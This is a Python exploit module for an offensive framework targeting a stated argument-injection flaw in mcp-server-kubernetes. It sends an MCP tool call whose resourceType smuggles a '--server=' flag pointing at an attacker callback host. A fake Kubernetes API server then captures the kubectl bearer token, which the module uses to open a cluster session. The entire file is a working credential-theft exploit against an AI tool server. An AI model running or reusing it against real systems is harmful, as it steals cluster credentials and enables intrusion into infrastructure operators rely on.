#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-61459 — mcp-server-kubernetes argument injection (kubectl bearer token exfil)."""

from __future__ import annotations

import threading
from urllib.parse import urlparse

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.http_server import Http_server
from lib.protocols.kubernetes.kubernetes_client import KubernetesClient


class Module(Auxiliary, Http_client, Http_server):
    __info__ = {
        "name": "mcp-server-kubernetes < 3.9.0 - Argument Injection (CVE-2026-61459)",
        "description": (
            "CVE-2026-61459: argument injection in kubectl_get, kubectl_describe, and kubectl_delete "
            "via resourceType/name parameters. Starts a local fake Kubernetes API callback server, "
            "injects --server=<callback> into the MCP tool call, captures the bearer token from "
            "kubectl, and optionally registers a Kubernetes session when CLUSTER_API is set."
        ),
        "author": ["Mohammed Idrees Banyamer", "KittySploit Team"],
        "cve": ["CVE-2026-61459"],
        "references": [
            "https://github.com/Flux159/mcp-server-kubernetes",
        ],
        "tags": [
            "mcp",
            "kubernetes",
            "kubectl",
            "argument-injection",
            "token-exfil",
            "cve-2026-61459",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "credential_harvest"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": True,
            "produces": ["secret_exposure", "risk_signals", "credentials"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "tech_hints_any": ["mcp", "kubernetes"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "secret_exposure", "from_detail": "k8s bearer token"},
                    {"capability": "credentials", "from_detail": "k8s bearer token"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "post/kubernetes/gather/whoami",
                    "post/kubernetes/gather/secrets",
                ],
            },
        },
    }

    port = OptPort(8080, "MCP server port", required=True)
    ssl = OptBool(False, "Use HTTPS for MCP endpoint", required=True)
    path = OptString("/mcp", "MCP JSON-RPC endpoint path", required=False)
    callback_host = OptString(
        "",
        "Host/IP reachable by the MCP server for --server injection (defaults to lhost)",
        required=False,
    )
    srvport = OptPort(6443, "Local fake Kubernetes API callback port", required=True)
    tool = OptString("kubectl_get", "MCP tool (kubectl_get, kubectl_describe, kubectl_delete)", required=False)
    namespace = OptString("default", "Kubernetes namespace argument", required=False)
    cluster_api = OptString(
        "",
        "Real Kubernetes API URL for session validation (e.g. https://10.0.0.1:6443)",
        required=False,
    )
    insecure = OptBool(False, "Skip TLS verification when connecting to CLUSTER_API", required=False)
    create_session = OptBool(True, "Register a Kubernetes session when token + CLUSTER_API work", required=False)
    wait_seconds = OptInteger(15, "Seconds to wait for kubectl callback after triggering exploit", required=False)

    def __init__(self, framework=None):
        super().__init__(framework)
        self._captured_token = None
        self._callback_hit = False
        self._capture_event = threading.Event()

    def _opt(self, option) -> str:
        return str(option.value if hasattr(option, "value") else option or "").strip()

    def _mcp_path(self) -> str:
        value = self._opt(self.path) or "/mcp"
        return value if value.startswith("/") else f"/{value}"

    def _resolve_callback_host(self) -> str:
        manual = self._opt(self.callback_host)
        if manual:
            return manual
        lhost = self._opt(getattr(self, "lhost", ""))
        if lhost:
            return lhost
        srvhost = self._opt(getattr(self, "srvhost", "0.0.0.0"))
        if srvhost and srvhost not in ("0.0.0.0", "::"):
            return srvhost
        raise RuntimeError(
            "Set callback_host or lhost to an address reachable by the MCP server"
        )

    def _callback_url(self, host: str) -> str:
        port = int(self.srvport.value if hasattr(self.srvport, "value") else self.srvport)
        return f"http://{host}:{port}"

    def _call_tool(self, server_url: str):
        tool = self._opt(self.tool) or "kubectl_get"
        return self.http_request(
            method="POST",
            path=self._mcp_path(),
            json={
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {
                    "name": tool,
                    "arguments": {
                        "resourceType": f"--server={server_url}",
                        "name": "dummy-pod",
                        "namespace": self._opt(self.namespace) or "default",
                        "output": "json",
                    },
                },
                "id": 1,
            },
            headers={"Content-Type": "application/json"},
            timeout=15,
        )

    def _start_capture_server(self):
        module = self
        module._captured_token = None
        module._callback_hit = False
        module._capture_event.clear()

        def handle_request(handler):
            module._callback_hit = True
            client = handler.client_address[0] if handler.client_address else "unknown"
            auth = handler.headers.get("Authorization", "")
            print_status(f"Kubectl callback from {client} {handler.command} {handler.path}")
            if auth.lower().startswith("bearer "):
                token = auth[7:].strip()
                if token:
                    module._captured_token = token
                    module._capture_event.set()
                    print_success(f"Bearer token captured ({len(token)} chars)")
            body = (
                b'{"kind":"Status","apiVersion":"v1","status":"Failure",'
                b'"message":"Unauthorized","reason":"Unauthorized","code":401}'
            )
            handler.send_response(401)
            handler.send_header("Content-Type", "application/json")
            handler.send_header("Content-Length", str(len(body)))
            handler.end_headers()
            if handler.command != "HEAD":
                handler.wfile.write(body)

        if not self._opt(self.srvhost):
            self.srvhost = "0.0.0.0"
        methods = {method: handle_request for method in ("GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS")}
        return self.listen_http(methods, forever=True, background=True)

    def _register_k8s_session(self, token: str) -> bool:
        cluster_api = self._opt(self.cluster_api)
        if not cluster_api:
            print_warning("Token captured — set CLUSTER_API to open a Kubernetes session")
            return True

        if not cluster_api.startswith("http"):
            cluster_api = f"https://{cluster_api}"

        if not bool(self.create_session):
            print_info("create_session disabled — token captured but no session registered")
            return True

        if not self.framework or not hasattr(self.framework, "session_manager"):
            print_warning("Framework session manager unavailable")
            return True

        client = KubernetesClient(
            api_server=cluster_api,
            token=token,
            insecure=bool(self.insecure),
            namespace=self._opt(self.namespace) or "default",
            timeout=float(self.timeout or 30),
        )
        if not client.connect():
            print_error("Token captured but CLUSTER_API rejected it — check URL / INSECURE")
            client.close()
            return True

        version = client.get_version()
        parsed = urlparse(client.api_server)
        host = parsed.hostname or cluster_api
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        session_id = self.framework.session_manager.create_session(
            host=host,
            port=int(port),
            session_type=SessionType.KUBERNETES.value,
            data={
                "api_server": client.api_server,
                "namespace": client.namespace,
                "token": client.token,
                "insecure": client.insecure,
                "auth_mode": "token",
                "git_version": version.get("gitVersion", ""),
                "protocol": "kubernetes",
                "session_type": "kubernetes",
                "platform": "cloud",
            },
        )
        registry = getattr(self.framework, "_kubernetes_session_clients", None)
        if registry is None:
            self.framework._kubernetes_session_clients = {}
            registry = self.framework._kubernetes_session_clients
        registry[session_id] = client
        print_success(
            f"Kubernetes session {session_id} ({version.get('gitVersion') or 'unknown'})"
        )
        return True

    def check(self):
        response = self._call_tool("http://127.0.0.1:1")
        if response and int(response.status_code or 0) == 200:
            return {
                "vulnerable": True,
                "reason": "MCP server accepted injected kubectl tool call",
                "confidence": "medium",
            }
        status = getattr(response, "status_code", "?")
        return {
            "vulnerable": False,
            "reason": f"MCP tool call failed: HTTP {status}",
            "confidence": "medium",
        }

    def run(self):
        httpd = None
        try:
            callback_host = self._resolve_callback_host()
        except RuntimeError as exc:
            print_error(str(exc))
            return False

        callback_url = self._callback_url(callback_host)
        wait_s = max(int(self.wait_seconds.value if hasattr(self.wait_seconds, "value") else self.wait_seconds), 1)
        bind_port = int(self.srvport.value if hasattr(self.srvport, "value") else self.srvport)

        print_status("CVE-2026-61459 — mcp-server-kubernetes argument injection")
        print_info(f"Callback server: {self.srvhost}:{bind_port}")
        print_info(f"Injecting --server={callback_url}")

        try:
            httpd = self._start_capture_server()
            response = self._call_tool(callback_url)
            if not response:
                print_error("No response from MCP endpoint")
                return False

            print_info(f"MCP response: HTTP {response.status_code}")
            body = (response.text or "").strip()
            if body:
                print_info(body[:500])

            if int(response.status_code or 0) != 200:
                print_error("MCP server rejected the tool call")
                return False

            print_info(f"Waiting up to {wait_s}s for kubectl callback...")
            if not self._capture_event.wait(timeout=wait_s):
                print_error("No bearer token received on callback server")
                if self._callback_hit:
                    print_warning("Callback received but Authorization header was missing")
                return False

            return self._register_k8s_session(self._captured_token)
        finally:
            if httpd:
                self.web_shutdown(httpd)
